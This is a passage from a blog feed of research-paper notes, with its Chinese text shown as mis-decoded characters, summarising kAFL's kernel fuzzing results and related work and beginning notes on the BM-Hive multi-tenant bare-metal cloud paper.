id="5-3-Fuzzing-macOS"><a href="#5-3-Fuzzing-macOS" class="headerlink" title="5.3 Fuzzing macOS"></a>5.3 Fuzzing macOS</h2><p>ä½œè€…åœ¨ HFS é©±åŠ¨ä¸­æ‰¾åˆ°äº† 150 ä¸ª crash å¹¶æ‰‹åŠ¨ç¡®è®¤äº†è‡³å°‘ä¸‰ä¸ªä¸ºå¯¼è‡´å†…æ ¸å´©æºƒçš„ç‹¬ç«‹æ¼æ´ï¼Œè¿™å¯ä»¥é€ æˆ DoS æ”»å‡»ï¼Œæ­¤å¤– kAFL åœ¨ APFS å†…æ ¸æ‰©å±•ä¸­å‘ç°äº† 220 ä¸ªç‹¬ç«‹çš„ crashï¼Œç›®å‰éƒ½è¢«ä¸ŠæŠ¥ç»™äº† Apple</p><h2 id="5-4-Rediscovery-of-Known-Bugs"><a href="#5-4-Rediscovery-of-Known-Bugs" class="headerlink" title="5.4 Rediscovery of Known Bugs"></a>5.4 Rediscovery of Known Bugs</h2><p>ä½œè€…åœ¨ <code>keyctl()</code> æ¥å£ä¸Šè¯„ä¼°äº† kAFLï¼ŒæˆåŠŸæ‰¾åˆ°æ­¤å‰å·²çŸ¥çš„ CVE-2016-07583ï¼Œå¹¶æ‰¾åˆ°äº†ä¸€ä¸ªæœªçŸ¥é”™è¯¯ï¼ˆå·²è¢«åˆ†é…ä¸º CVE-2016-86504ï¼‰ï¼Œå…¶åœ¨çŸ­çŸ­ä¸€å°æ—¶å†…æˆåŠŸè§¦å‘ 17 ä¸ªç‹¬ç«‹çš„ KASan æŠ¥å‘Šä¸ 15 ä¸ªç‹¬ç«‹çš„ panicï¼Œç”Ÿæˆäº†è¶…è¿‡ 3400 ä¸‡ä¸ªè¾“å…¥ï¼Œå‘ç°äº† 295 ä¸ªæœ‰è¶£çš„è¾“å…¥ï¼Œæ¯ç§’æ‰§è¡Œçº¦ 9k æ¬¡ï¼Œè¯¥å®éªŒä¸º 8 è¿›ç¨‹å¹¶è¡Œ</p><h2 id="5-5-Detected-Vulnerabilities"><a href="#5-5-Detected-Vulnerabilities" class="headerlink" title="5.5 Detected Vulnerabilities"></a>5.5 Detected Vulnerabilities</h2><p>kAFL åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°è¶…è¿‡ 1k ä¸ªç‹¬ç«‹çš„ crashï¼Œä½œè€…æ‰‹åŠ¨åˆ†æäº†ä¸€éƒ¨åˆ†å¹¶ä¸å¯¹åº”çš„ç»´æŠ¤è€…ç¡®è®¤äº†å¦‚ä¸‹æ¼æ´ï¼š</p><p><img src="https://s2.loli.net/2024/07/30/fiTSLREMCYJ3yUF.png"></p><h2 id="5-6-Fuzzing-Performance"><a href="#5-6-Fuzzing-Performance" class="headerlink" title="5.6 Fuzzing Performance"></a>5.6 Fuzzing Performance</h2><p>ä½œè€…åˆ›å»ºäº†ä¸€ä¸ªåŸºäº jsmn çš„ JSON parser driverï¼ˆå¦‚ List 2 æ‰€ç¤ºï¼Œåœ¨ JSON å­—ç¬¦ä¸²ä»¥ <code>&quot;KAFL&quot;</code> èµ·å§‹æ—¶è§¦å‘ crashï¼‰å¹¶åœ¨ä¸‰ä¸ªç³»ç»Ÿä¸Šè¿›è¡Œäº†æµ‹è¯•ï¼Œå¹¶ä¸ TriforceAFL å’Œ syzkaller è¿›è¡Œå¯¹æ¯”</p><p><img src="https://s2.loli.net/2024/07/30/SjNFMhyBD1oHze6.png" alt="Listing 2: The JSON parser kernel module used for the coverage benchmarks."></p><p>30 åˆ†é’Ÿçš„æµ‹è¯•ç»“æœå¦‚è¡¨ 1 æ‰€ç¤ºï¼Œç„¶è€Œ TriforceAFL æœªèƒ½è§¦å‘å´©æºƒè·¯å¾„ï¼Œå› è€Œå¾ˆéš¾ä¸ kAFL æ¯”è¾ƒè¦†ç›–ç‡</p><p><img src="https://s2.loli.net/2024/07/30/xW3cr8Zqo2fleR9.png" alt="Table 1: kAFL and TriforceAFL fuzzing performance on the JSON sample driver."></p><p>è¦†ç›–ç‡ç»“æœå¦‚å›¾ 6 æ‰€ç¤ºï¼Œä¸è¿‡éšç€ fuzzing æ—¶é—´å¢é•¿ï¼Œæ–°è·¯å¾„æ›´éš¾è¢«å‘ç°ï¼Œå› æ­¤è¿™ä¸æ˜¯ä¸ªå¥½çš„æŒ‡æ ‡</p><p><img src="https://s2.loli.net/2024/07/30/rYB9mdXJPUAhbRt.png" alt="Figure 6: Coverage comparison of kAFL (initramfs) and TriforceAFL. kAFL takes less than 3 minutes to find the same number of paths as TriforceAFL does in 30 minutes (each running 1 process)."></p><p>å›¾ 7 æ˜¾ç¤ºäº† kAFL ä¸ TriforceAFL åœ¨ raw execution ä¸Šçš„æ€§èƒ½å¯¹æ¯”</p><p><img src="https://s2.loli.net/2024/07/30/4ArNBvGP57hx8Hn.png" alt="Figure 7: Raw execution performance comparison."></p><p>ä¸ syzkaller é—´ä½œè€…å¹¶æœªåšæ€§èƒ½å¯¹æ¯”ï¼Œå› ä¸ºå…¶æ˜¯ä¸€ä¸ªé«˜åº¦ç‰¹å®šçš„ syzkaller fuzzerï¼Œä¸”å…¶çŸ¥è¯†ä½¿å…¶å¯ä»¥åœ¨æ— åé¦ˆä¸‹äº§ç”Ÿæ›´é«˜çš„ä»£ç è¦†ç›–ç‡ï¼Œå› æ­¤é™¤éä½œè€…å®ç°äº†ç›¸åŒçš„ç³»ç»Ÿè°ƒç”¨é€»è¾‘ï¼Œå¦åˆ™è¦†ç›–ç‡å¯¹æ¯”ä¼šå­˜åœ¨è¯¯å¯¼æ€§</p><h2 id="5-7-KVM-PT-Overhead"><a href="#5-7-KVM-PT-Overhead" class="headerlink" title="5.7 KVM-PT Overhead"></a>5.7 KVM-PT Overhead</h2><p>ä½œè€…åœ¨ä¸€ä¸ª <code>i5-6500@3.2Ghz</code> æ¡Œé¢ç¯å¢ƒä¸­å¯¹äº†ä¸åŒçš„ KVM-PT é…ç½®ï¼Œå°†è¿½è¸ªé™å®šåœ¨å†…æ ¸åœ°å€ç©ºé—´ï¼Œå›¾ 8 è¯´æ˜äº†æ²¡æœ‰ KVM-PT ä¸‹çš„æ‰§è¡Œç›¸å¯¹å¼€é”€</p><blockquote><p>å¤šçš„ä¸æŠ„äº†ï¼Œè‡ªå·±çœ‹åŸæ–‡ï¼šï¼‰</p></blockquote><p><img src="https://s2.loli.net/2024/07/30/e1QHoCktLNDbGvu.png" alt="Figure 8: Overhead for compiling QEMU-2.6.0 in a traced VM."></p><h2 id="5-8-Decoder-Engine"><a href="#5-8-Decoder-Engine" class="headerlink" title="5.8 Decoder Engine"></a>5.8 Decoder Engine</h2><p>è§£ç è¿‡ç¨‹æ²¡æœ‰ç¡¬ä»¶åŠ é€Ÿï¼Œå› æ­¤è§£ç å™¨å¯¹ fuzzing æ•´ä½“æ€§èƒ½æœ‰æ˜¾è‘—å½±å“ï¼Œä½œè€…å°†è‡ªå·±çš„è§£ç å™¨ä¸ Intel ptxed è¿›è¡Œäº†å¯¹æ¯”ï¼Œåœ¨ä¸€ä¸ª <code>i5-6500@3.2Ghz</code> ç¯å¢ƒä¸­è¿›è¡Œäº†æµ‹è¯•ï¼Œç»“æœå¦‚å›¾ 9 æ‰€ç¤º</p><p><img src="https://s2.loli.net/2024/07/30/bZ7wTskyI1F2dm9.png" alt="Figure 9: kAFL and ptxed decoding time on multiple copies of the same trace (kAFL is up to 30 times faster)."></p><h1 id="0x06-Related-Work"><a href="#0x06-Related-Work" class="headerlink" title="0x06. Related Work"></a>0x06. Related Work</h1><h2 id="6-1-Black-Box-Fuzzers"><a href="#6-1-Black-Box-Fuzzers" class="headerlink" title="6.1 Black-Box Fuzzers"></a>6.1 Black-Box Fuzzers</h2><p>æ­¤ç±» fuzzer ä¸ç›®æ ‡ç¨‹åºæ²¡æœ‰ä»»ä½•äº¤äº’ï¼Œä¸ºäº†æé«˜æ•ˆç‡é€šå¸¸ä¼šè¿›è¡Œä¸€äº›å‡è®¾ï¼Œä¾‹å¦‚ <a href="https://github.com/aoh/radamsa">Radamsa</a> æˆ– <a href="https://github.com/samhocevar/zzuf">zzuf</a> ä¼šå‡è®¾å¤§é‡è¦†ç›–ç‡è‰¯å¥½çš„è¾“å…¥ä¼šåå¤å‘ç”Ÿå˜å¼‚ä¸é‡ç»„ï¼Œè€Œ <a href="http://www.peachfuzzer.com/">Peach</a> ä¸ <a href="https://github.com/OpenRCE/sulley">Sulley</a> éœ€è¦ç¨‹åºå‘˜æŒ‡å®šå¦‚ä½•ç”Ÿæˆçœ‹èµ·æ¥å‡ ä¹åƒçœŸæ­£æ–‡ä»¶çš„åŠå¯ç”¨è¾“å…¥æ–‡ä»¶ï¼›ä¸Šè¿°è¿™äº›éƒ½æœ‰ä¸€ä¸ªé‡è¦ç¼ºé™·ï¼šè€—æ—¶è¿‡é«˜</p><p>ä¸ºäº†æé«˜é»‘ç›’ fuzzer çš„æ€§èƒ½ï¼Œç ”ç©¶äººå‘˜æå‡ºäº†ä¸å°‘æŠ€æœ¯ï¼Œå¦‚ <a href="https://www.usenix.org/conference/usenixsecurity12/technical-sessions/presentation/holler">Holler æå‡ºäº†ä»æ—§çš„ crash è¾“å…¥ä¸­ä¹ å¾—è¾“å…¥è¯­æ³•çš„æœ‰è¶£éƒ¨åˆ†</a> ï¼Œè¿˜æœ‰äººæå‡ºæ ¹æ®ç¨‹åºè¿½è¸ªæ¥æ¨æ–­è¾“å…¥è¯­æ³•ç­‰ï¼Œ<a href="https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-rebert.pdf">Rebert åˆ™ä¼˜åŒ–äº†å¯¹æœ‰è¶£è¾“å…¥çš„é€‰æ‹©</a></p><h2 id="6-2-White-Box-fuzzers"><a href="#6-2-White-Box-fuzzers" class="headerlink" title="6.2 White-Box fuzzers"></a>6.2 White-Box fuzzers</h2><p>ç¨‹åºåˆ†ææ–¹æ³•è¢«å¼•å…¥ä»¥å‡å°‘æµ‹è¯•è´Ÿæ‹…ï¼Œç±»ä¼¼ <a href="https://dl.acm.org/doi/pdf/10.1145/2090147.2094081">SAGE</a> ã€<a href="https://dl.acm.org/doi/10.1145/1064978.1065036">DART</a> ã€ <a href="https://www.usenix.org/legacy/event/osdi08/tech/full_papers/cadar/cadar.pdf">KLEE</a> ã€ <a href="https://www.usenix.org/legacy/events/sec09/tech/full_papers/molnar.pdf">SmartFuzz</a> ã€<a href="https://ieeexplore.ieee.org/document/6234425">Mayhem</a> è¿™æ ·çš„å·¥å…·å°è¯•ä½¿ç”¨ç¬¦å·æ‰§è¡Œä¸çº¦æŸæ±‚è§£æŠ€æœ¯æšä¸¾å¤æ‚è·¯å¾„ï¼Œ<a href="https://ieeexplore.ieee.org/document/5504701">TaintScope</a> ã€<a href="https://ieeexplore.ieee.org/document/5070546">BuzzFuzz</a> ã€<a href="https://www.ndss-symposium.org/ndss2017/ndss-2017-programme/vuzzer-application-aware-evolutionary-fuzzing/">Vuzzer</a> åˆ©ç”¨æ±¡ç‚¹è¿½è¸ªä¸ç±»ä¼¼çš„åŠ¨æ€åˆ†ææŠ€æœ¯æ¥å‘ç°æ–°è·¯å¾„ï¼Œä»–ä»¬é€šå¸¸éƒ½èƒ½æ‰¾åˆ°éšè—åœ¨ checksumã€magic constraint ç­‰éš¾ä»¥è¢«éšæœºè¾“å…¥æ»¡è¶³çš„å¤æ‚ä»£ç è·¯å¾„ï¼Œå¦ä¸€ç§åŠæ³•æ˜¯ä½¿ç”¨ç›¸åŒç±»å‹çš„ä¿¡æ¯æ¥æœç´¢å±é™©è¡Œä¸ºè€Œéæ–°ä»£ç è·¯å¾„</p><p>ç¼ºç‚¹æ˜¯è¿™äº›æŠ€æœ¯é€šå¸¸éš¾ä»¥å®ç°å¹¶æ‰©å±•åˆ°å¤§å‹ç¨‹åºä¸Šï¼Œæ®ä½œè€…æ‰€çŸ¥ç›®å‰æš‚æ—¶æ²¡æœ‰é’ˆå¯¹æ“ä½œç³»ç»Ÿçš„è¿™æ ·çš„å·¥å…·</p><h2 id="6-3-Gray-Box-Fuzzers"><a href="#6-3-Gray-Box-Fuzzers" class="headerlink" title="6.3 Gray-Box Fuzzers"></a>6.3 Gray-Box Fuzzers</h2><p>ç°ç›’ fuzzer åœ¨ä¿ç•™é»‘ç›’çš„é«˜ååé‡ä¸ç®€æ˜“æ€§è·å¾—ç™½ç›’æ‰€ä½¿ç”¨çš„é«˜çº§æœºåˆ¶æä¾›çš„é¢å¤–è¦†ç›–ï¼Œæ¯”è¾ƒå¥½çš„ç°ç›’æµ‹è¯•çš„ä¾‹å­æ˜¯ AFLï¼Œå…¶ä½¿ç”¨è¦†ç›–ç‡ä¿¡æ¯æŒ‡å¼•ä»¥é¿å…åœ¨ä¸è§¦å‘æ–°çŠ¶æ€çš„è¾“å…¥ä¸Šè€—è´¹æ—¶é—´ï¼Œå…¶ä»–çš„ä¸€äº› fuzzer ä¹Ÿä½¿ç”¨äº†ç±»ä¼¼æœºåˆ¶</p><p>ä¸ºäº†è¿›ä¸€æ­¥æé«˜ç°ç›’æµ‹è¯•çš„æœ‰æ•ˆæ€§ï¼Œè®¸å¤šç”¨åœ¨é»‘ç›’æµ‹è¯•ä¸­çš„æŠ€æœ¯ä¹Ÿè¢«ä½¿ç”¨ï¼Œä¾‹å¦‚ <a href="https://dl.acm.org/doi/10.1145/2976749.2978428">BÃ¶hme å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨é©¬å°”å¯å¤«é“¾æ¥æé«˜ç°ç›’æµ‹è¯•æ€§èƒ½</a></p><h2 id="6-4-Coverage-Guided-Kernel-Fuzzers"><a href="#6-4-Coverage-Guided-Kernel-Fuzzers" class="headerlink" title="6.4 Coverage-Guided Kernel Fuzzers"></a>6.4 Coverage-Guided Kernel Fuzzers</h2><p>Vyukov æ”¾å‡ºçš„é¡¹ç›® <a href="https://github.com/google/syzkaller">syzkaller</a> æ˜¯ç¬¬ä¸€ä¸ªå…¬å¼€çš„èƒ½å¤Ÿç”¨äºè¦†ç›–ç‡å¼•å¯¼çš„å†…æ ¸ fuzzer ï¼›Nossum ä¸ Casanovas é€šè¿‡ä¸€ä¸ª<a href="https://events.static.linuxfound.org/sites/events/files/slides/AFL%20filesystem%20fuzzing%2C%20Vault%202016_0.pdf">ä¿®æ”¹ç‰ˆ AFL</a> è¯æ˜äº†ç»å¤§éƒ¨åˆ† Linux æ–‡ä»¶ç³»ç»Ÿé©±åŠ¨å¯¹äºåé¦ˆé©±åŠ¨çš„æ¨¡ç³Šæµ‹è¯•éƒ½æ˜¯è„†å¼±çš„</p><p>Hertz å’Œ Newsham åœ¨ 2016 å¹´å‘å¸ƒäº†åä¸º <a href="https://github.com/nccgroup/TriforceAFL">TriforceAFL</a> çš„ AFL ä¿®æ”¹ç‰ˆï¼Œå…¶åŸºäºä¸€ä¸ªä¿®æ”¹ç‰ˆçš„ QEMU ï¼Œåˆ©ç”¨äº†å¯¹åº”çš„æ¨¡æ‹Ÿåç«¯é€šè¿‡åœ¨æ‰§è¡Œæ§åˆ¶æµæ›´æ”¹æŒ‡ä»¤åç¡®å®šå½“å‰çš„æŒ‡ä»¤æŒ‡é’ˆæ¥æµ‹é‡æ¨¡ç³Šæµ‹è¯•è¿›åº¦ï¼Œè¿™ç†è®ºä¸Šå¯ä»¥æµ‹è¯•ä»»ä½• QEMU èƒ½æ¨¡æ‹Ÿçš„æ“ä½œç³»ç»Ÿï¼Œä½†äº‹å®ä¸Š TriforceAFL ä»…é™äºèƒ½å¤Ÿä»åªè¯»æ–‡ä»¶ç³»ç»Ÿå¯åŠ¨çš„æ“ä½œç³»ç»Ÿï¼ˆåŸºæœ¬ä¸Šåªæœ‰ UNIX-likeï¼‰ï¼Œæ— æ³•æµ‹è¯• macOS æˆ– Windows ç­‰é—­æºæ“ä½œç³»ç»Ÿ</p><h1 id="0x07-Discussion"><a href="#0x07-Discussion" class="headerlink" title="0x07. Discussion"></a>0x07. Discussion</h1><p>ä½œè€…çš„å·¥ä½œä»æœ‰ä¸€äº›ç¼ºé™·</p><p><strong>OS-Specific Code.</strong>  ä½œè€…ä½¿ç”¨äº†å°‘é‡ç‰¹å®šäºæ“ä½œç³»ç»Ÿçš„ä»£ç æ¥æ‰§è¡Œä¸‰ä¸ªä»»åŠ¡ï¼šå°†æ¨¡ç³Šæµ‹è¯•è¾“å…¥è½¬ä¸ºä¸æ“ä½œç³»ç»Ÿçš„äº¤äº’ã€è·å–æ“ä½œç³»ç»Ÿå¯¹å´©æºƒå¤„ç†ç¨‹åºçš„åœ°å€ã€è¿”å›æŸäº›é©±åŠ¨ç¨‹åºçš„åœ°å€</p><p>è¿™äº›åŠŸèƒ½éƒ½ä¸æ˜¯å¿…é¡»çš„ï¼Œç¬¬ä¸€ä¸ªé—®é¢˜å¯ä»¥ç”¨é€šç”¨ç³»ç»Ÿè°ƒç”¨æ¥é¿å…ï¼ŒåŒæ—¶ä¹Ÿä¸ä¸€å®šéœ€è¦å´©æºƒå¤„ç†ç¨‹åºçš„åœ°å€æ¥æ£€æµ‹ VM crash</p><p><strong>Supported CPUs.</strong> æœ¬æ–‡çš„å·¥ä½œå±€é™äºæ”¯æŒ Intel VT-x æŠ€æœ¯çš„ CPUï¼Œä½†å¯¹äºå“ªäº› CPU ç¡®ä¹æ”¯æŒæŒ‡ä»¤æŒ‡é’ˆè¿‡æ»¤ã€multi-entry ToPA ç­‰å«ç³Šå…¶è¾ï¼Œ</p><p><strong>Just-In-Time Code.</strong> intel PT å¹¶ä¸æä¾›å·²æ‰§è¡ŒæŒ‡ä»¤æŒ‡é’ˆçš„å®Œæ•´åˆ—è¡¨ï¼Œè¿™éœ€è¦è§£ç å™¨å®Œæˆæ§åˆ¶æµé‡å»ºï¼Œä½†è‹¥ç¨‹åºåœ¨è¿è¡Œæ—¶è¢«ä¿®æ”¹ï¼ˆä¾‹å¦‚ JITï¼‰åˆ™æ— æ³•å‡†ç¡®æ¢å¤è¿è¡Œæ—¶æ§åˆ¶æµï¼Œå› æ­¤è§£ç å™¨éœ€è¦å¯¹ç¨‹åºåº”ç”¨çš„ä¿®æ”¹ä¿¡æ¯ï¼Œå¦‚ <a href="https://dl.acm.org/doi/10.1145/2523649.2523675">Deng ç­‰äººä½¿ç”¨ EPT violation å®ç°</a>ï¼Œæ›´è€çš„åšæ³•æ˜¯<a href="https://dl.acm.org/doi/10.1145/1455770.1455779">ä½¿ç”¨å½±å­é¡µè¡¨</a></p><p><strong>Multibyte Compares.</strong> æœ¬æ–‡çš„å·¥ä½œæ— æ³•çŸ¥é“ç¨‹åºä¸­è¾ƒå¤§çš„ magic valuesï¼Œä½†ä½¿ç”¨æ¯”å¦‚æ··åˆæ‰§è¡Œï¼ˆå¦‚ <a href="https://sites.cs.ucsb.edu/~vigna/publications/2016_NDSS_Driller.pdf">Driller</a> ï¼‰æˆ–æ˜¯æ±¡ç‚¹è¿½è¸ªï¼ˆå¦‚ <a href="https://www.ndss-symposium.org/ndss2017/ndss-2017-programme/vuzzer-application-aware-evolutionary-fuzzing/">Vuzzer</a> ï¼‰æŠ€æœ¯å¯ä»¥æé«˜æ€§èƒ½ï¼Œä½†éƒ½æ— æ³•è½»æ˜“è¢«åº”ç”¨åˆ°é—­æºæ“ä½œç³»ç»Ÿå†…æ ¸ä¸­</p><p><strong>Ring 3 Fuzzing.</strong> ä½œè€…ä»…é’ˆå¯¹å†…æ ¸ä»£ç ä½¿ç”¨äº†è¯¥æŠ€æœ¯ï¼Œä½†è¿™ä¸ªæ–¹æ³•ä¹Ÿé€‚ç”¨äºç”¨äºç”¨æˆ·æ€ï¼Œä½œè€…é¢„è®¡å…¶å°†ç”±äºåŸºäºåŠ¨æ€äºŒè¿›åˆ¶æ’æ¡©çš„æ–¹æ³•ï¼ˆå¦‚ <a href="https://github.com/googleprojectzero/winafl">winAFL</a> ï¼‰</p><h1 id="0x08-Conclusion"><a href="#0x08-Conclusion" class="headerlink" title="0x08. Conclusion"></a>0x08. Conclusion</h1><p>ä½œè€…æå‡ºäº†ä½¿ç”¨ CPU æ–°ç‰¹æ€§çš„åé¦ˆé©±åŠ¨çš„å†…æ ¸æ¨¡ç³Šæµ‹è¯•æ–¹æ³•ï¼Œæ€§èƒ½æ˜æ˜¾ä¼˜äºå…¶ä»–æ–¹æ³•ï¼Œå¾ˆå¥½å¾ˆå¼ºå¤§ğŸ†ğŸ‡ğŸ‡ğŸ†</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Rabbitâ€™s adventures in kernel land&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="FUZZ" scheme="https://arttnba3.github.io/tags/FUZZ/"/>
    
    <category term="è®ºæ–‡ç¬”è®°" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
    <category term="è™šæ‹ŸåŒ–" scheme="https://arttnba3.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="ç³»ç»Ÿè™šæ‹ŸåŒ–" scheme="https://arttnba3.github.io/tags/%E7%B3%BB%E7%BB%9F%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="Intel PT" scheme="https://arttnba3.github.io/tags/Intel-PT/"/>
    
  </entry>
  
  <entry>
    <title>ã€PAPER.0x06ã€‘è®ºæ–‡ç¬”è®°ï¼šHigh-density Multi-tenant Bare-metal Cloud</title>
    <link href="https://arttnba3.github.io/2024/07/27/PAPER-0X06-ASPLOS2020_BMHIVE/"/>
    <id>https://arttnba3.github.io/2024/07/27/PAPER-0X06-ASPLOS2020_BMHIVE/</id>
    <published>2024-07-26T20:25:38.000Z</published>
    <updated>2024-07-26T20:32:12.364Z</updated>
    
    <content type="html"><![CDATA[<p>å‡ºèµ°å­—èŠ‚ IaaS å¼€å‘å®ä¹ ä¸¤å¹´ï¼Œå½’æ¥è¯»å®‰å…¨ PhD ä¾ç„¶åœ¨åš DPU</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>æœ€è¿‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆåˆå¼€å§‹çœ‹ DPU äº†ï¼ˆåæ­£å°±æ˜¯å•¥éƒ½æƒ³å¼„ä¸€ç‚¹ï¼‰ï¼Œæ‰€ä»¥å…ˆä»è¿™ç¯‡éå¸¸ç»å…¸çš„è®ºæ–‡å…¥æ‰‹ï¼šï¼‰</p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>è™šæ‹ŸåŒ–æŠ€æœ¯æ˜¯ IaaS çš„åŸºçŸ³ï¼Œè™½ç„¶å¤šç§Ÿæˆ·å…±äº«åŒä¸€ç‰©ç†æœºæé«˜äº†æ•°æ®ä¸­å¿ƒæœåŠ¡å™¨çš„åˆ©ç”¨ç‡ï¼Œä½†å¸¦æ¥å¯¹å®‰å…¨é—®é¢˜çš„å¿§è™‘ï¼ˆå°¤å…¶æ˜¯ä¾§ä¿¡é“æ”»å‡»ï¼‰ï¼Œä¸”å¢åŠ äº†èµ„æºå¼€é”€ï¼›æ–°å…´çš„è£¸é‡‘å±äº‘æä¾›äº†å¼ºéš”ç¦»æ€§ä¸å¯¹ç¡¬ä»¶çš„å®Œå…¨è®¿é—®ï¼Œä½†åªèƒ½å°†æ•´å°ç‰©ç†æœåŠ¡å™¨ç§Ÿç»™ç”¨æˆ·ï¼Œæ— æ³•åœ¨å‡ºç§Ÿåå¯¹ç”¨æˆ·ç¨‹åºæ§åˆ¶ï¼Œä¸”æ‰©å±•æ€§å·®ã€æˆæœ¬æ•ˆç‡ä½</p><p>æœ¬æ–‡æå‡ºä¸€ç§æ–°çš„é«˜å¯†åº¦ã€å¤šç§Ÿæˆ·è£¸é‡‘å±äº‘è®¾è®¡ï¼š<code>BM-Hive</code> ï¼Œæ¯ä¸ªè£¸é‡‘å±å®¢æˆ·è¿è¡Œåœ¨å„è‡ªçš„è®¡ç®—æ¿ä¸Šâ€”â€”å¸¦æœ‰ä¸“æœ‰ CPU ä¸å†…å­˜çš„ PCIe æ‰©å±•æ¿ï¼Œå…¶è½¯ç¡¬ä»¶æ··åˆ virtio I&#x2F;O ç³»ç»Ÿå…è®¸å®¢æˆ·ç›´æ¥è®¿é—®äº‘ç½‘ç»œä¸å­˜å‚¨è®¾å¤‡ï¼›<code>BM-Hive</code> å¯ä»¥æ˜¾è‘—æå‡è£¸é‡‘å±æœåŠ¡çš„æˆæœ¬æ•ˆç›Šï¼Œä»ç¡¬ä»¶å±‚åˆ†éš”è£¸é‡‘å±ç”¨æˆ·ä»¥æä¾›æ›´å¥½çš„å®‰å…¨ä¸éš”ç¦»ï¼›<code>BM-Hive</code> è¢«ä½œè€…éƒ¨ç½²åœ¨æœ€å¤§çš„å…¬æœ‰äº‘åŸºç¡€è®¾æ–½ä¹‹ä¸€ä¸Šï¼Œä¸ºæ•°ä¸‡ç”¨æˆ·åŒæ—¶æœåŠ¡</p><h1 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h1><p>è™šæ‹ŸåŒ–æŠ€æœ¯æ˜¯å…¬æœ‰ IaaS äº‘çš„åŸºçŸ³ï¼ŒEPT è¿™æ ·çš„é«˜çº§è™šæ‹ŸåŒ–æŠ€æœ¯æ˜¾è‘—æå‡äº† VM æ€§èƒ½ï¼Œä½†å¤šç§Ÿæˆ·å…±äº«åŒä¸€ç‰©ç†æœºå¸¦æ¥å¯¹å®‰å…¨ä¸æ€§èƒ½çš„å¿§è™‘ï¼Œå°¤å…¶æ˜¯é’ˆå¯¹ CPU ç¼“å­˜ä¸è¶…çº¿ç¨‹ç­‰ç´§å¯†ç»“åˆçš„èµ„æºçš„ä¾§ä¿¡é“æ”»å‡»ï¼Œæ­¤å¤–å…±äº«èµ„æºå†²çªå¯ä»¥å¸¦æ¥ä¸å¯é¢„ä¼°çš„æ€§èƒ½æ³¢åŠ¨</p><p><strong>Limitations of existing approach</strong> ï¼šä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼Œç§Ÿæˆ·ç‹¬å ç‰©ç†æœºçš„è£¸é‡‘å±æœåŠ¡å‡ºç°äº†ï¼ˆç§°ä¸ºå•ç§Ÿæˆ·è£¸é‡‘å±æœåŠ¡å™¨ï¼Œå› ä¸ºåªèƒ½æ•´ä¸ªç§Ÿå‡ºï¼‰ï¼Œä½†å…¶ä»æœ‰ä¸€äº›æˆæœ¬æ•ˆç›Šã€æ€§èƒ½ã€äº’é€šæ€§ä¸Šçš„é™åˆ¶ï¼š</p><ul><li><strong>Cost</strong> ï¼šå•ç§Ÿæˆ·è£¸é‡‘å±æœåŠ¡å™¨åªèƒ½æ•´ä¸ªç§Ÿå‡ºï¼Œä½†ç”¨æˆ·ä¸ä¸€å®šéœ€è¦è¿™ä¹ˆå¤šæ€§èƒ½</li><li><strong>Single-thread performance</strong> ï¼šç»å¤§å¤šæ•°äº‘æœåŠ¡å™¨ä½¿ç”¨æ ¸æ•°å¤šä½†å•æ ¸å¼±çš„ Xeon ï¼Œè£¸é‡‘å±æœåŠ¡çš„ç”¨æˆ·é€šå¸¸éœ€è¦æ›´é«˜æ€§èƒ½</li><li><strong>Interoperability and manageability</strong> ï¼šè£¸é‡‘å±æœåŠ¡å¿…é¡»æ— ç¼ç»“åˆåˆ°ç°æœ‰äº‘ç³»ç»Ÿä¸­ä»¥ä»å¼¹æ€§äº‘æ¶æ„ä¸­å—ç›Šï¼Œç„¶è€Œå•ç§Ÿæˆ·è£¸é‡‘å±æœåŠ¡ä¸ç°æœ‰çš„åŸºäº VM çš„äº‘ä¸åŒï¼Œå…¶é€šå¸¸ç”± Intel Management Engine ç±»å·²çŸ¥ä¸å®‰å…¨ç³»ç»Ÿç®¡ç†ï¼Œä¸”è£¸é‡‘å±æœåŠ¡åº”å½“ä¸ VM é•œåƒå…¼å®¹ä»¥å¤ç”¨é•œåƒ</li></ul><p><strong>Our approach</strong> ï¼šæœ¬æ–‡ç»™å‡º <code>BM-Hive</code> çš„è®¾è®¡ï¼šä¸€ä¸ªå¯ä»¥è§£å†³æ‰€æœ‰è¿™äº›æŒ‘æˆ˜çš„å¯æ‰©å±•çš„å¤šç§Ÿæˆ·è£¸é‡‘å±æœåŠ¡ï¼Œå…¶ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼šä¸€ä¸ªè£¸é‡‘å± hypervisor ï¼ˆ <code>bm-hypervisor</code> ï¼Œå¯¹åº”ä¼ ç»Ÿçš„ <code>vm-hypervisor</code> ï¼‰ã€ä¸€ç»„è£¸é‡‘å±å®¢æˆ·ï¼ˆ <code>bm-guest</code> ï¼Œå¯¹åº”ä¼ ç»Ÿçš„ <code>vm-guest</code>ï¼‰ã€ä¸€ä¸ª IO æ¢çº½ï¼ˆ<code>IO-Bond</code>ï¼‰ï¼› <code>bm-hypervisor</code> è¿è¡Œåœ¨æœåŠ¡å™¨ä¸» CPU ä¸Šç®¡ç†æ‰€æœ‰ guests çš„ç”Ÿå‘½å‘¨æœŸå¹¶ä½œä¸º <code>IO-Bond</code> åç«¯ï¼Œä½†ä¸ä¼¼ <code>vm-hypervisor</code> é‚£æ 